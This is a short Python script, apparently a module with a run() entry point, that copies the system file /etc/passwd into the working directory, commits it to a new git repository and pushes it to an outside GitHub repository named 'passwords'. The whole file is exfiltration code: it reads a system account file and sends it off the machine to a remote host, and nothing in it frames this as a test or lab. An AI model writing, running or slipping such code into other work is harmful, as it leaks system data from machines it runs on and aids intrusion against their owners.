import shutil
from git import Repo

def run():
    archivo_origen = "/etc/passwd"
    archivo_destino_local = "passwd.txt"
    
    shutil.copy(archivo_origen, archivo_destino_local)
    
    repo = Repo.init('.')
    repo.index.add([archivo_destino_local])
    repo.index.commit("Copiar archivo /etc/hola")
    
    origin = repo.create_remote('origin', url='https://github.com/RubenMA12/passwords.git')
    origin.push()

if __name__ == "__main__":
    run()
